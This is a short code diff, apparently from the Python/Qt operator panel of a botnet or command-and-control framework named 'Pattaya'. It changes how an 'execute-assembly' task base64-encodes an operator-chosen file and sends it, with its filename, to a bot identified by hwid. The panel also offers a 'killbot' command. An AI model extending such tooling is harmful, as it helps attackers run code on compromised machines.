@@ -116,7 +116,8 @@ QTextEdit {
             self.bot_send_task_line_edit.clear()
             return
 
-        file = ""
+        incomingFile = ""
+        incomingFilename = ""
         if text == 'execute-assembly':
             file_name,_ = QFileDialog.getOpenFileName(self, "Open File",
                                                         ".",
@@ -125,8 +126,10 @@ QTextEdit {
             if file_name == "":
                 return
             
-            file = PattayaPanelUtil.base64_file_encode(file_name)
-            PattayaPanelUtil.panel_log_info(f'f{file_name} has been encoded in base64 format: f{file}')
+            incomingFilename = os.path.basename(file_name)
+            
+            incomingFile = PattayaPanelUtil.base64_file_encode(file_name)
+            PattayaPanelUtil.panel_log_info(f'f{file_name} has been encoded in base64 format: f{incomingFile}')
         
         if text == 'killbot':
             ret = QMessageBox.warning(self, 
@@ -154,7 +157,8 @@ QTextEdit {
             "hwid": self.bot['hwid'],
             "command": command,
             "arguments": arg,
-            "file": file
+            "incomingFile": incomingFile,
+            "incomingFilename": incomingFilename
         }
         try:
             self.socket_io_client.send_command('panel_send_bot_task', bot_task)
